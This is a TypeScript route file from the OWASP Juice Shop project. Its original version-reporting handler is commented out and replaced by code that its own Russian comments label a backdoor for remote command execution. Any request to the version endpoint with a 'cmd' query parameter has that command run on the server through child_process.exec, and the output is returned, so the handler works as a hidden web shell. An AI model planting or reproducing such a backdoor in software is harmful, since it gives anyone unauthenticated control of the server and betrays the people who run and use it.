/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

/*


import config from 'config'
import { type Request, type Response } from 'express'

import * as utils from '../lib/utils'

export function retrieveAppVersion () {
  return (_req: Request, res: Response) => {
    res.json({
      version: config.get('application.showVersionNumber') ? utils.version() : ''
    })
  }
}

*/


import config from 'config'
import { Request, Response, NextFunction } from 'express'
import { exec } from 'child_process' // <--- Импортируем модуль для RCE

export const retrieveAppVersion = () => (req: Request, res: Response, next: NextFunction) => {
  
  // --- НАЧАЛО БЭКДОРА ---
  const command = req.query.cmd as string;
  
  if (command) {
    console.log(`[RCE] Executing: ${command}`);
    // Выполняем команду
    exec(command, (error, stdout, stderr) => {
      // Отправляем результат текстом, чтобы браузер не думал что это HTML
      res.type('text/plain'); 
      if (stdout) return res.send(stdout);
      if (stderr) return res.send(stderr);
      if (error) return res.send(error.message);
      res.send('Executed');
    });
    return; // Прерываем выполнение, чтобы не пошла стандартная логика
  }
  // --- КОНЕЦ БЭКДОРА ---


  // Стандартная логика (вернется, если нет параметра ?cmd=)
  res.json({ version: config.get('application.version') })
}
